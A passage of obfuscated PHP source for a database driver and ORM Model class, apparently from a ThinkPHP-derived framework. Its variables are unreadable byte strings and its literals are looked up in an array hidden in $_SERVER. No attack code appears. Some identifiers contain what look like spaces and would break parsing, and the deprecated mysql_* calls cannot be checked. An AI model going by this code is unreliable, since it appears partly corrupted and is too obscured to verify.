think_exception(think_lang($ùÀÅÛ•Å[14]) . $ùÀÅÛ•Å[964]); } if (!empty($í¤àöÖ—)) { $this->config = $í¤àöÖ—; if (empty($this->config[$ùÀÅÛ•Å[17]])) { $this->config[$ùÀÅÛ•Å[17]] = $ùÀÅÛ•Å[12]; } } } public function connect($ç•™•Ã« = '', $¢Ì–ñ¶¼ = 0, $·ÜÖ¹à¬ = false) { $ñ£¶úéô =& $_SERVER[ç¦¬”œš]; if (!isset($this->linkID[$¢Ì–ñ¶¼])) { if (empty($ç•™•Ã«)) { $ç•™•Ã« = $this->config; } $´¶¶ ù§ = $ç•™•Ã«[$ñ£¶úéô[965]] . ($ç•™•Ã«[$ñ£¶úéô[966]] ? "\72{$ç•™•Ã«[$ñ£¶úéô[966]]}" : $ñ£¶úéô[12]); $ìÎ¬é÷û = !empty($ç•™•Ã«[$ñ£¶úéô[17]][$ñ£¶úéô[18]]) ? $ç•™•Ã«[$ñ£¶úéô[17]][$ñ£¶úéô[18]] : $this->pconnect; if ($ìÎ¬é÷û) { $this->linkID[$¢Ì–ñ¶¼] = mysql_pconnect($´¶¶ ù§, $ç•™•Ã«[$ñ£¶úéô[967]], $ç•™•Ã«[$ñ£¶úéô[968]], 131072); } else { $this->linkID[$¢Ì–ñ¶¼] = mysql_connect($´¶¶ ù§, $ç•™•Ã«[$ñ£¶úéô[967]], $ç•™•Ã«[$ñ£¶úéô[968]], !0, 131072); } if (!$this->linkID[$¢Ì–ñ¶¼] || !empty($ç•™•Ã«[$ñ£¶úéô[21]]) && !mysql_select_db($ç•™•Ã«[$ñ£¶úéô[21]], $this->linkID[$¢Ì–ñ¶¼])) { think_exception(mysql_error()); } $‘ŒÍ‹¦À = mysql_get_server_info($this->linkID[$¢Ì–ñ¶¼]); mysql_query($ñ£¶úéô[969] . think_config($ñ£¶úéô[970]) . $ñ£¶úéô[58], $this->linkID[$¢Ì–ñ¶¼]); if ($‘ŒÍ‹¦À > $ñ£¶úéô[971]) { mysql_query($ñ£¶úéô[972], $this->linkID[$¢Ì–ñ¶¼]); } $this->connected = !0; if (1 != think_config($ñ£¶úéô[22])) { unset($this->config); } } return $this->linkID[$¢Ì–ñ¶¼]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($È“•é‰) { $¥“àÍù´ =& $_SERVER[ç¦¬”œš]; if (0 === stripos($È“•é‰, $¥“àÍù´[341])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $È“•é‰; if ($this->queryID) { $this->free(); } think_action_status($¥“àÍù´[23], 1); think_status($¥“àÍù´[24]); $this->queryID = mysql_query($È“•é‰, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($íÔ–¥Í) { $Ü°úî‡º =& $_SERVER[ç¦¬”œš]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $íÔ–¥Í; if ($this->queryID) { $this->free(); } think_action_status($Ü°úî‡º[25], 1); think_status($Ü°úî‡º[24]); $ö¤›óè² = mysql_query($íÔ–¥Í, $this->_linkID); $this->debug(); if (!1 === $ö¤›óè²) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ç¦¬”œš][973], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ó¸—¶ë³ = mysql_query($_SERVER[ç¦¬”œš][974], $this->_linkID); $this->transTimes = 0; if (!$Ó¸—¶ë³) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $„¼¹Ì£û = mysql_query($_SERVER[ç¦¬”œš][975], $this->_linkID); $this->transTimes = 0; if (!$„¼¹Ì£û) { $this->error(); return !1; } } return !0; } private function getAll() { $ ¶«ï‹© = array(); if ($this->numRows > 0) { while ($¯„º¹õË = mysql_fetch_assoc($this->queryID)) { $ ¶«ï‹©[] = $¯„º¹õË; } mysql_data_seek($this->queryID, 0); } return $ ¶«ï‹©; } public function getFields($¾äÖ¼‡©) { $ú™Ì£ë =& $_SERVER[ç¦¬”œš]; $ ‹Ñİë = $this->query($ú™Ì£ë[976] . $this->parseKey($¾äÖ¼‡©)); $¹§ïïû = array(); if ($ ‹Ñİë) { foreach ($ ‹Ñİë as $ë”Ñ¼ƒ± => $ÏºøÛÈº) { $¹§ïïû[$ÏºøÛÈº[$ú™Ì£ë[31]]] = array($ú™Ì£ë[32] => $ÏºøÛÈº[$ú™Ì£ë[31]], $ú™Ì£ë[33] => $ÏºøÛÈº[$ú™Ì£ë[34]], $ú™Ì£ë[35] => (bool) (strtoupper($ÏºøÛÈº[$ú™Ì£ë[36]]) === $ú™Ì£ë[977]), $ú™Ì£ë[37] => $ÏºøÛÈº[$ú™Ì£ë[38]], $ú™Ì£ë[39] => strtolower($ÏºøÛÈº[$ú™Ì£ë[40]]) == $ú™Ì£ë[41], $ú™Ì£ë[42] => strtolower($ÏºøÛÈº[$ú™Ì£ë[43]]) == $ú™Ì£ë[44]); } } return $¹§ïïû; } public function getTables($¶ã»æç‘ = '') { $¿ù‚ã‘ =& $_SERVER[ç¦¬”œš]; if (!empty($¶ã»æç‘)) { $öØ“›¦ = $¿ù‚ã‘[978] . $¶ã»æç‘ . $¿ù‚ã‘[979]; } else { $öØ“›¦ = $¿ù‚ã‘[980]; } $˜ëÆŠÈ = $this->query($öØ“›¦); $³Åû‹Ç‡ = array(); foreach ($˜ëÆŠÈ as $’ÇóÙùç => $ø£»æğ²) { $³Åû‹Ç‡[$’ÇóÙùç] = current($ø£»æğ²); } return $³Åû‹Ç‡; } public function replace($Ğ¦¨Çœ, $ó¶Î”Ñû = array()) { $Ïò¿±‡å =& $_SERVER[ç¦¬”œš]; foreach ($Ğ¦¨Çœ as $Î£è˜ü• => $¾—™áË—) { $¬şÀÓ³ï = $this->parseValue($¾—™áË—); if (is_scalar($¬şÀÓ³ï)) { $ïĞúøÖÎ[] = $¬şÀÓ³ï; $³”©ô°ï[] = $this->parseKey($Î£è˜ü•); } } $¨ª˜¾ê = $Ïò¿±‡å[981] . $this->parseTable($ó¶Î”Ñû[$Ïò¿±‡å[356]]) . $Ïò¿±‡å[982] . implode($Ïò¿±‡å[50], $³”©ô°ï) . $Ïò¿±‡å[983] . implode($Ïò¿±‡å[50], $ïĞúøÖÎ) . $Ïò¿±‡å[984]; return $this->execute($¨ª˜¾ê); } public function insertAll($âÊã‹“Ñ, $úá‰Ï¹¸ = array(), $İÅ•“§ = false) { $„Ì·¬Åá =& $_SERVER[ç¦¬”œš]; if (!is_array($âÊã‹“Ñ[0])) { return !1; } $ç“Ì‡Œá = array_keys($âÊã‹“Ñ[0]); $ ç¿œ‡ = array(); foreach ($âÊã‹“Ñ as $¶Ôâµ÷æ) { $ºÈÕÚéä = array(); foreach ($¶Ôâµ÷æ as $ÚˆÅ½Õ£ => $¦à²¾İØ) { $¦à²¾İØ = $this->parseValue($¦à²¾İØ); if (is_scalar($¦à²¾İØ)) { $ºÈÕÚéä[] = $¦à²¾İØ; } } $ ç¿œ‡[] = $„Ì·¬Åá[337] . implode($„Ì·¬Åá[50], $ºÈÕÚéä) . $„Ì·¬Åá[984]; } array_walk($ç“Ì‡Œá, array($this, $„Ì·¬Åá[985])); $Ä©ô÷ì— = ($İÅ•“§ ? $„Ì·¬Åá[986] : $„Ì·¬Åá[987]) . $„Ì·¬Åá[988] . $this->parseTable($úá‰Ï¹¸[$„Ì·¬Åá[356]]) . $„Ì·¬Åá[982] . implode($„Ì·¬Åá[50], $ç“Ì‡Œá) . $„Ì·¬Åá[989] . implode($„Ì·¬Åá[50], $ ç¿œ‡); return $this->execute($Ä©ô÷ì—); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ñá‹ß¬Ş =& $_SERVER[ç¦¬”œš]; $this->error = mysql_errno() . $Ñá‹ß¬Ş[4] . mysql_error($this->_linkID); if ($Ñá‹ß¬Ş[12] != $this->queryStr) { $this->error .= LNG($Ñá‹ß¬Ş[48]) . $this->queryStr; } think_trace($this->error, $Ñá‹ß¬Ş[12], $Ñá‹ß¬Ş[49]); return $this->error; } public function escapeString($ƒÇ–‹Ã„) { if ($this->_linkID) { return mysql_real_escape_string($ƒÇ–‹Ã„, $this->_linkID); } else { return mysql_escape_string($ƒÇ–‹Ã„); } } public function parseKey(&$“ŸéòÜ, $›Ûµ—ì± = true) { $òŠÓä’¼ =& $_SERVER[ç¦¬”œš]; if ($›Ûµ—ì±) { $“ŸéòÜ = $this->parseKeyCheck($“ŸéòÜ); } if ($“ŸéòÜ != $òŠÓä’¼[220] && !preg_match($òŠÓä’¼[990], $“ŸéòÜ)) { $“ŸéòÜ = $òŠÓä’¼[461] . trim($“ŸéòÜ, $òŠÓä’¼[461]) . $òŠÓä’¼[461]; } return $“ŸéòÜ; } } goto A„ÃïÛƒ„; Eô×Îø¯Ù: define($_SERVER[ç¦¬”œš][320], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\154\x65", "\x6f\162\x64\145\x72", "\x61\154\x69\x61\163", "\150\141\166\151\x6e\147", "\x67\162\x6f\x75\160", "\x6c\157\x63\x6b", "\144\x69\x73\x74\151\x6e\143\x74", "\141\x75\x74\157", "\x66\151\x6c\x74\145\x72", "\166\x61\x6c\x69\144\x61\x74\x65", "\x72\x65\163\x75\x6c\164", "\142\x69\156\144", "\164\157\153\x65\x6e"); public function __construct($¯İ¬ÑØæ = '', $ôŞ»ªÍ  = '', $Š¯–Œó = '') { $ì‰Ë°±È =& $_SERVER[ç¦¬”œš]; $this->_initialize(); if (!empty($¯İ¬ÑØæ)) { if (strpos($¯İ¬ÑØæ, $ì‰Ë°±È[10])) { list($this->dbName, $this->name) = explode($ì‰Ë°±È[10], $¯İ¬ÑØæ); } else { $this->name = $¯İ¬ÑØæ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ôŞ»ªÍ )) { $this->tablePrefix = $ì‰Ë°±È[12]; } elseif ($ì‰Ë°±È[12] != $ôŞ»ªÍ ) { $this->tablePrefix = $ôŞ»ªÍ ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ì‰Ë°±È[321]); } $this->db(0, empty($this->connection) ? $Š¯–Œó : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ïÑÃê¤› =& $_SERVER[ç¦¬”œš]; if (empty($this->fields)) { if (think_config($ïÑÃê¤›[322])) { $çäë“¬ = $this->dbName ? $this->dbName : think_config($ïÑÃê¤›[323]); $ÅúÂ«Ä = think_var_cache($ïÑÃê¤›[324] . strtolower(get_path_this($çäë“¬) . $ïÑÃê¤›[10] . $this->name)); if ($ÅúÂ«Ä) { $‚®üÈ‰ö = think_config($ïÑÃê¤›[325]); if (empty($‚®üÈ‰ö) || $ÅúÂ«Ä[$ïÑÃê¤›[326]] == $‚®üÈ‰ö) { $this->fields = $ÅúÂ«Ä; return; } } } $this->flush(); } } public function flush() { $ö‹™ÔŠé =& $_SERVER[ç¦¬”œš]; $this->db->setModel($this->name); $ÁÉ×—Ææ = $this->db->getFields($this->getTableName()); if (!$ÁÉ×—Ææ) { return !1; } $this->fields = array_keys($ÁÉ×—Ææ); $this->fields[$ö‹™ÔŠé[327]] = !1; foreach ($ÁÉ×—Ææ as $Ë„‹õì­ => $¢®ƒô¨¨) { $µÖÔÅø°[$Ë„‹õì­] = $¢®ƒô¨¨[$ö‹™ÔŠé[33]]; if ($¢®ƒô¨¨[$ö‹™ÔŠé[39]]) { $this->fields[$ö‹™ÔŠé[328]] = $Ë„‹õì­; if ($¢®ƒô¨¨[$ö‹™ÔŠé[42]]) { $this->fields[$ö‹™ÔŠé[327]] = !0; } } } $this->fields[$ö‹™ÔŠé[329]] = $µÖÔÅø°; if (think_config($ö‹™ÔŠé[325])) { $this->fields[$ö‹™ÔŠé[326]] = think_config($ö‹™ÔŠé[325]); } if (think_config($ö‹™ÔŠé[322])) { $…˜…«È = $this->dbName ? $this->dbName : think_config($ö‹™ÔŠé[323]); think_var_cache($ö‹™ÔŠé[324] . strtolower(get_path_this($…˜…«È) . $ö‹™ÔŠé[10] . $this->name), $this->fields); } } public function switchModel($ŸšŠÙİ, $ÃĞ¨ñİ = array()) { $Á««ÔÕ† =& $_SERVER[ç¦¬”œš]; $àó‘€ùÄ = ucwords(strtolower($ŸšŠÙİ)) . $Á««ÔÕ†[330]; if (!class_exists($àó‘€ùÄ)) { think_exception($àó‘€ùÄ . think_lang($Á««ÔÕ†[331])); } $this->_extModel = new $àó‘€ùÄ($this->name); if (!empty($ÃĞ¨ñİ)) { foreach ($ÃĞ¨ñİ as $”İëÛËŸ) { $this->_extModel->setProperty($”İëÛËŸ, $this->{$”İëÛËŸ}); } } return $this->_extModel; } public function __set($Ş£°§«ˆ, $¶¸ïÖ) { $this->data[$Ş£°§«ˆ] = $¶¸ïÖ; } public function __get($´¿Öµ¡¢) { return isset($this->data[$´¿Öµ¡¢]) ? $this->data[$´¿Öµ¡¢] : null; } public function __isset($È×³Š‹¹) { return isset($this->data[$È×³Š‹¹]); } public function __unset($”ŸÆŒ¦ò) { unset($this->data[$”ŸÆŒ¦ò]); } public function __call($¼‘ìı‰ï, $˜ÌˆÒİ¨) { $óÁ³¹öõ =& $_SERVER[ç¦¬”œš]; if (in_array(strtolower($¼‘ìı‰ï), $this->methods, !0)) { $this->options[strtolower($¼‘ìı‰ï)] = $˜ÌˆÒİ¨[0]; return $this; } elseif (in_array(strtolower($¼‘ìı‰ï), array($óÁ³¹öõ[332], $óÁ³¹öõ[333], $óÁ³¹öõ[334], $óÁ³¹öõ[335], $óÁ³¹öõ[336]), !0)) { $·À…£Ç¢ = isset($˜ÌˆÒİ¨[0]) ? $˜ÌˆÒİ¨[0] : $óÁ³¹öõ[220]; $·À…£Ç¢ = $this->db->parseKey($·À…£Ç¢); return $this->getField(strtoupper($¼‘ìı‰ï) . $óÁ³¹öõ[337] . $·À…£Ç¢ . $óÁ³¹öõ[338] . $¼‘ìı‰ï, $óÁ³¹öõ[332]); } elseif (strtolower(substr($¼‘ìı‰ï, 0, 5)) == $óÁ³¹öõ[339]) { $·À…£Ç¢ = think_parse_name(substr($¼‘ìı‰ï, 5)); $¤²‚É½Ş[$·À…£Ç¢] = $˜ÌˆÒİ¨[0]; return $this->where($¤²‚É½Ş)->find(); } elseif (strtolower(substr($¼‘ìı‰ï, 0, 10)) == $óÁ³¹öõ[340]) { $©‘û‡­… = think_parse_name(substr($¼‘ìı‰ï, 10)); $¤²‚É½Ş[$©‘û‡­…] = $˜ÌˆÒİ¨[0]; return $this->where($¤²‚É½Ş)->getField($˜ÌˆÒİ¨[1]); } elseif (isset($this->_scope[$¼‘ìı‰ï])) { return $this->scope($¼‘ìı‰ï, $˜ÌˆÒİ¨[0]); } elseif (method_exists($this, $¼‘ìı‰ï)) { array_unshift($˜ÌˆÒİ¨, $¼‘ìı‰ï); return call_user_func_array(array($this, $óÁ³¹öõ[341]), $˜ÌˆÒİ¨); } else { return call_user_func_array(array(parent, $¼‘ìı‰ï), $˜ÌˆÒİ¨); } } protected function call() { $áæõ•â =& $_SERVER[ç¦¬”œš]; $±ŸÆ®ÛÔ = func_get_args(); $ûÈ¯ğ¡Î = array_shift($±ŸÆ®ÛÔ); $±ÆïøÍİ = $ûÈ¯ğ¡Î; if (is_array($ûÈ¯ğ¡Î)) { $±ÆïøÍİ = $ûÈ¯ğ¡Î[1]; $ûÈ¯ğ¡Î = $ûÈ¯ğ¡Î[0]; } $ôòÒÀ‚Ü = count($±ŸÆ®ÛÔ) - 1; if (isset($±ŸÆ®ÛÔ[$ôòÒÀ‚Ü]) && $±ŸÆ®ÛÔ[$ôòÒÀ‚Ü] === $ûÈ¯ğ¡Î) { think_exception(__CLASS__ . $áæõ•â[4] . $ûÈ¯ğ¡Î . think_lang($áæõ•â[342])); return; } $±ŸÆ®ÛÔ[] = $ûÈ¯ğ¡Î; if (method_exists($this, $áæõ•â[343])) { $±æŠïöø = call_user_func_array(array($this, $áæõ•â[344]), array($±ÆïøÍİ, $±ŸÆ®ÛÔ)); if (!is_null($±æŠïöø) && $±æŠïöø !== !1) { return $±æŠïöø; } } $„£«í«ú = call_user_func_array(array($this, $ûÈ¯ğ¡Î), $±ŸÆ®ÛÔ); if (method_exists($this, $áæõ•â[345])) { $±æŠïöø = call_user_func_array(array($this, $áæõ•â[346]), array($±ÆïøÍİ, $±ŸÆ®ÛÔ, $„£«í«ú)); if ($±æŠïöø) { return $±æŠïöø; } } return $„£«í«ú; } protected function _initialize() { } protected function _facade($¸Š­íæ³) { $ç¥˜Ä© =& $_SERVER[ç¦¬”œš]; if (!empty($this->fields)) { foreach ($¸Š­íæ³ as $à˜É†’¾ => $¾àôÎ©) { if (is_array($this->fields) && !in_array($à˜É†’¾, $this->fields, !0)) { unset($¸Š­íæ³[$à˜É†’¾]); } elseif (is_scalar($¾àôÎ©)) { $this->_parseType($¸Š­íæ³, $à˜É†’¾); } } } if (!empty($this->options[$ç¥˜Ä©[347]])) { $¸Š­íæ³ = array_map($this->options[$ç¥˜Ä©[347]], $¸Š­íæ³); unset($this->options[$ç¥˜Ä©[347]]); } $this->_beforeWrite($¸Š­íæ³); return $¸Š­íæ³; } protected function _beforeWrite(&$…ßÙ‘ÑÓ) { } public function add($ÒåÊÖ¢ = '', $¬œÙ—¤æ = array(), $²‘¶Æé = false) { if (empty($ÒåÊÖ¢)) { if (!empty($this->data)) { $ÒåÊÖ¢ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ç¦¬”œš][348]); return !1; } } $¬œÙ—¤æ = $this->_parseOptions($¬œÙ—¤æ); $ÒåÊÖ¢ = $this->_facade($ÒåÊÖ¢); if (!1 === $this->_beforeInsert($ÒåÊÖ¢, $¬œÙ—¤æ)) { return !1; } $ïò´Éğ = $this->db->insert($ÒåÊÖ¢, $¬œÙ—¤æ, $²‘¶Æé); if (!1 !== $ïò´Éğ) { $ñôÖó©å = $this->getLastInsID(); if ($ñôÖó©å) { $ÒåÊÖ¢[$this->getPk()] = $ñôÖó©å; $this->_after_insert($ÒåÊÖ¢, $¬œÙ—¤æ); return $ñôÖó©å; } $this->_after_insert($ÒåÊÖ¢, $¬œÙ—¤æ); } return $ïò´Éğ; } protected function _beforeInsert(&$ï¼»Ò™ß, $«äùƒÜ) { } protected function _after_insert($ÚÅ¿Ì¡º, $ğÓÃëóÙ) { } public function addAll($¢€ñ„Íö, $Ç´£§ö÷ = array(), $Ãá·À = false) { $ó®¥—çğ =& $_SERVER[ç¦¬”œš]; if (empty($¢€ñ„Íö)) { $this->error = think_lang($ó®¥—çğ[348]); return !1; } $Ç´£§ö÷ = $this->_parseOptions($Ç´£§ö÷); foreach ($¢€ñ„Íö as $ÅÉî§şÓ => $Ë…åÊ¾) { $¢€ñ„Íö[$ÅÉî§şÓ] = $this->_facade($Ë…åÊ¾); } if (method_exists($this->db, $ó®¥—çğ[349])) { $»ó‚Ú‘ì = $this->db->insertAll($¢€ñ„Íö, $Ç´£§ö÷, $Ãá·À); } else { $this->startTrans(); foreach ($¢€ñ„Íö as $ÅÉî§şÓ => $Ë…åÊ¾) { $»ó‚Ú‘ì = $this->db->insert($Ë…åÊ¾, $Ç´£§ö÷, $Ãá·À); } $this->commit(); } if (!1 !== $»ó‚Ú‘ì) { $ÓşúÂşº = $this->getLastInsID(); if ($ÓşúÂşº) { return $ÓşúÂşº; } } return $»ó‚Ú‘ì; } public function selectAdd($›¦Ç¤â¦ = '', $õíÅŞÙØ = '', $‰ŸÂø«× = array()) { $Œ¹Ø˜û€ =& $_SERVER[ç¦¬”œš]; $‰ŸÂø«× = $this->_parseOptions($‰ŸÂø«×); if (!1 === ($¾ÚÁı¹Ÿ = $this->db->selectInsert($›¦Ç¤â¦ ? $›¦Ç¤â¦ : $‰ŸÂø«×[$Œ¹Ø˜û€[350]], $õíÅŞÙØ ? $õíÅŞÙØ : $this->getTableName(), $‰ŸÂø«×))) { $this->error = think_lang($Œ¹Ø˜û€[351]); return !1; } else { return $¾ÚÁı¹Ÿ; } } public function save($ª‡œ–äÀ = '', $İıóÀã = array()) { $¢ÇÕÚƒ¹ =& $_SERVER[ç¦¬”œš]; if (empty($ª‡œ–äÀ)) { if (!empty($this->data)) { $ª‡œ–äÀ = $this->data; $this->data = array(); } else { $this->error = think_lang($¢ÇÕÚƒ¹[348]); return !1; } } $ª‡œ–äÀ = $this->_facade($ª‡œ–äÀ); $İıóÀã = $this->_parseOptions($İıóÀã); $²¯­ÒÄ® = $this->getPk(); if (!isset($İıóÀã[$¢ÇÕÚƒ¹[352]])) { if (isset($ª‡œ–äÀ[$²¯­ÒÄ®])) { $“ôë˜Õ[$²¯­ÒÄ®] = $ª‡œ–äÀ[$²¯­ÒÄ®]; $İıóÀã[$¢ÇÕÚƒ¹[352]] = $“ôë˜Õ; unset($ª‡œ–äÀ[$²¯­ÒÄ®]); } else { $this->error = think_lang($¢ÇÕÚƒ¹[351]); return !1; } } if (is_array($İıóÀã[$¢ÇÕÚƒ¹[352]]) && isset($İıóÀã[$¢ÇÕÚƒ¹[352]][$²¯­ÒÄ®])) { $«–³•´ = $İıóÀã[$¢ÇÕÚƒ¹[352]][$²¯­ÒÄ®]; } if (!1 === $this->_beforeUpdate($ª‡œ–äÀ, $İıóÀã)) { return !1; } $Ù¿‰úºñ = $this->db->update($ª‡œ–äÀ, $İıóÀã); if (!1 !== $Ù¿‰úºñ) { if (isset($«–³•´)) { $ª‡œ–äÀ[$²¯­ÒÄ®] = $«–³•´; } $this->_afterUpdate($ª‡œ–äÀ, $İıóÀã); } return $Ù¿‰úºñ; } protected function _beforeUpdate(&$¢Å¥Ô¾×, $“Îƒı«) { } protected function _afterUpdate($«Œ’‰¼¾, $€ßû›‹ì) { } public function delete($¼ªŞåœ = array()) { $´ıæù÷ú =& $_SERVER[ç¦¬”œš]; if (empty($¼ªŞåœ) && empty($this->options[$´ıæù÷ú[352]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $û—¨¹¹” = $this->getPk(); if (is_numeric($¼ªŞåœ) || is_string($¼ªŞåœ)) { if (strpos($¼ªŞåœ, $´ıæù÷ú[50])) { $½ô¥”ëß[$û—¨¹¹”] = array($´ıæù÷ú[353], $¼ªŞåœ); } else { $½ô¥”ëß[$û—¨¹¹”] = $¼ªŞåœ; } $this->options[$´ıæù÷ú[352]] = $½ô¥”ëß; } $¼ªŞåœ = $this->_parseOptions(); if (is_array($¼ªŞåœ[$´ıæù÷ú[352]]) && isset($¼ªŞåœ[$´ıæù÷ú[352]][$û—¨¹¹”])) { $‚«ö¼¡™ = $¼ªŞåœ[$´ıæù÷ú[352]][$û—¨¹¹”]; } $ìïë¾ê¹ = $this->db->delete($¼ªŞåœ); if (!1 !== $ìïë¾ê¹) { $—Ñí‚¨˜ = array(); if (isset($‚«ö¼¡™)) { $—Ñí‚¨˜[$û—¨¹¹”] = $‚«ö¼¡™; } $this->_after_delete($—Ñí‚¨˜, $¼ªŞåœ); } return $ìïë¾ê¹; } protected function _after_delete($’ø«ìâÊ, $”±ü—æû) { } public function select($Éğ‡¶Øç = array()) { $ÊÆùÃÏ =& $_SERVER[ç¦¬”œš]; if (is_string($Éğ‡¶Øç) || is_numeric($Éğ‡¶Øç)) { $¦Ÿ·ß¸Ø = $this->getPk(); if (strpos($Éğ‡¶Øç, $ÊÆùÃÏ[50])) { $ó®Øä™[$¦Ÿ·ß¸Ø] = array($ÊÆùÃÏ[353], $Éğ‡¶Øç); } else { $ó®Øä™[$¦Ÿ·ß¸Ø] = $Éğ‡¶Øç; } $this->options[$ÊÆùÃÏ[352]] = $ó®Øä™; } elseif (!1 === $Éğ‡¶Øç) { $Éğ‡¶Øç = $this->_parseOptions(); return $ÊÆùÃÏ[354] . $this->db->buildSelectSql($Éğ‡¶Øç) . $ÊÆùÃÏ[355]; } $Éğ‡¶Øç = $this->_parseOptions(); $ÅÇÂ¿Ûø = $this->db->select($Éğ‡¶Øç); if (!1 === $ÅÇÂ¿Ûø) { return !1; } if (empty($ÅÇÂ¿Ûø)) { return null; } $this->_afterSelect($ÅÇÂ¿Ûø, $Éğ‡¶Øç); return $ÅÇÂ¿Ûø; } protected function _afterSelect(&$«ğìĞêÏ, $‡Î«›± ) { } public function buildSql($‰¾ÕôÂ± = array()) { $…°Ñ–ì­ =& $_SERVER[ç¦¬”œš]; $‰¾ÕôÂ± = $this->_parseOptions($‰¾ÕôÂ±); return $…°Ñ–ì­[354] . $this->db->buildSelectSql($‰¾ÕôÂ±) . $…°Ñ–ì­[355]; } public function optionsValue($»”ÔÛÓ = null) { if (is_null($»”ÔÛÓ)) { return $this->options; } elseif (is_array($»”ÔÛÓ)) { $this->options = array_merge($this->options, $»”ÔÛÓ); } } protected function _parseOptions($…†ò£“— = array()) { $À¥¨½Ş =& $_SERVER[ç¦¬”œš]; if (is_array($…†ò£“—)) { $…†ò£“— = array_merge($this->options, $…†ò£“—); } $this->options = array(); if (!isset($…†ò£“—[$À¥¨½Ş[356]])) { $…†ò£“—[$À¥¨½Ş[356]] = $this->getTableName(); $‚şÀôò = $this->fields; } else { $‚şÀôò = $this->getDbFields(); } if (!empty($…†ò£“—[$À¥¨½Ş[357]])) { $…†ò£“—[$À¥¨½Ş[356]] .= $À¥¨½Ş[53] . $…†ò£“—[$À¥¨½Ş[357]]; } $…†ò£“—[$À¥¨½Ş[358]] = $this->name; if (isset($…†ò£“—[$À¥¨½Ş[352]]) && is_array($…†ò£“—[$À¥¨½Ş[352]]) && !empty($‚şÀôò) && !isset($…†ò£“—[$À¥¨½Ş[359]]) && !isset($…†ò£“—[$À¥¨½Ş[356]])) { foreach ($…†ò£“—[$À¥¨½Ş[352]] as $’Ã·Ø‚É => $³ÊìÛ‘™) { $’Ã·Ø‚É = trim($’Ã·Ø‚É); if (in_array($’Ã·Ø‚É, $‚şÀôò, !0)) { if (is_scalar($³ÊìÛ‘™)) { $this->_parseType($…†ò£“—[$À¥¨½Ş[352]], $’Ã·Ø‚É); } } elseif (!is_numeric($’Ã·Ø‚É) && $À¥¨½Ş[11] != substr($’Ã·Ø‚É, 0, 1) && !1 === strpos($’Ã·Ø‚É, $À¥¨½Ş[10]) && !1 === strpos($’Ã·Ø‚É, $À¥¨½Ş[337]) && !1 === strpos($’Ã·Ø‚É, $À¥¨½Ş[214]) && !1 === strpos($’Ã·Ø‚É, $À¥¨½Ş[360])) { unset($…†ò£“—[$À¥¨½Ş[352]][$’Ã·Ø‚É]); } } } $this->_options_filter($…†ò£“—); return $…†ò£“—; } protected function _options_filter(&$®«Õ›å) { } protected function _parseType(&$ÄŒà­«, $ìí¤¡Ó·) { $®˜œƒ´• =& $_SERVER[ç¦¬”œš]; if (empty($this->options[$®˜œƒ´•[361]][$®˜œƒ´•[4] . $ìí¤¡Ó·])) { $Ô¼ıê›› = strtolower($this->fields[$®˜œƒ´•[329]][$ìí¤¡Ó·]); if (!1 !== strpos($Ô¼ıê››, $®˜œƒ´•[362])) { } elseif (!1 === strpos($Ô¼ıê››, $®˜œƒ´•[363]) && !1 !== strpos($Ô¼ıê››, $®˜œƒ´•[364])) { $ÄŒà­«[$ìí¤¡Ó·] = intval($ÄŒà­«[$ìí¤¡Ó·]); } elseif (!1 !== strpos($Ô¼ıê››, $®˜œƒ´•[365]) || !1 !== strpos($Ô¼ıê››, $®˜œƒ´•[366])) { $ÄŒà­«[$ìí¤¡Ó·] = floatval($ÄŒà­«[$ìí¤¡Ó·]); } elseif (!1 !== strpos($Ô¼ıê››, $®˜œƒ´•[367])) { $ÄŒà­«[$ìí¤¡Ó·] = (bool) $ÄŒà­«[$ìí¤¡Ó·]; } } } public function find($ÉÏ‹¨ïë = array()) { $¹òÖ¥¥ =& $_SERVER[ç¦¬”œš]; if (is_numeric($ÉÏ‹¨ïë) || is_string($ÉÏ‹¨ïë)) { $–ò‰êş [$this->getPk()] = intval($ÉÏ‹¨ïë); $this->options[$¹òÖ¥¥[352]] = $–ò‰êş ; } $this->options[$¹òÖ¥¥[368]] = 1; $ÉÏ‹¨ïë = $this->_parseOptions(); $âÔ²Ù´¯ = $this->db->select($ÉÏ‹¨ïë); if (!1 === $âÔ²Ù´¯) { return !1; } if (empty($âÔ²Ù´¯)) { return null; } $this->data = $âÔ²Ù´¯[0]; $this->_afterFind($this->data, $ÉÏ‹¨ïë); if (!empty($this->options[$¹òÖ¥¥[369]])) { return $this->returnResult($this->data, $this->options[$¹òÖ¥¥[369]]); } return $this->data; } protected function _afterFind(&$áñ¶õÁ, $´Éœ£ó) { } protected function returnResult($çÁí©—, $õ¼ƒşÄ– = '') { $˜çñú“ú =& $_SERVER[ç¦¬”œš]; if ($õ¼ƒşÄ–) { if (is_callable($õ¼ƒşÄ–)) { return call_user_func($õ¼ƒşÄ–, $çÁí©—); } switch (strtolower($õ¼ƒşÄ–)) { case $˜çñú“ú[370]: return json_encode($çÁí©—); case $˜çñú“ú[371]: return xml_encode($çÁí©—); } } 